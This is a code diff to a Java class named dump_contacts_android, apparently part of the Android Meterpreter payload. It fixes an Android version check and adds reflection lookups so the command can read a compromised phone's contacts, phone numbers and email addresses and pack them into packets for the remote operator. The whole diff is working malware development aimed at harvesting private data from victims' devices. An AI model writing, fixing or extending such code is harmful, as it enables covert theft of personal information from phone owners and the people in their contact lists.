@@ -30,9 +30,11 @@ public class dump_contacts_android implements Command {
 		ContentResolver cr = AndroidMeterpreter.getContext()
 				.getContentResolver();
 
-		if (Integer.parseInt(Build.VERSION.RELEASE.substring(0, 0)) >= 2) {
+		if (Integer.parseInt(Build.VERSION.RELEASE.substring(0, 1)) >= 2) {
 
-			Uri PhoneUri = null, EmailUri = null, ContactUri = null;
+			Uri ContactUri = null, PhoneUri = null, EmailUri = null;
+			Class<?> c = Class.forName("android.provider.ContactsContract$Contacts");
+			ContactUri = (Uri) c.getField("CONTENT_URI").get(ContactUri);			
 			Cursor cur = cr.query(ContactUri, null, null, null, null);
 
 			if (cur.getCount() > 0) {
@@ -46,6 +48,8 @@ public class dump_contacts_android implements Command {
 					pckt.addOverflow(TLV_TYPE_CONTACT_NAME,
 							cur.getString(cur.getColumnIndex("display_name")));
 
+					c = Class.forName("android.provider.ContactsContract$Data");
+					PhoneUri = (Uri) c.getField("CONTENT_URI").get(PhoneUri);
 					Cursor pCur = cr.query(PhoneUri, null, "contact_id"
 							+ " = ?", new String[] { id }, null);
 
@@ -55,6 +59,8 @@ public class dump_contacts_android implements Command {
 					}
 					pCur.close();
 
+					c = Class.forName("android.provider.ContactsContract$CommonDataKinds$Email");
+					EmailUri = (Uri) c.getField("CONTENT_URI").get(EmailUri);
 					Cursor emailCur = cr.query(EmailUri, null, "contact_id"
 							+ " = ?", new String[] { id }, null);
 
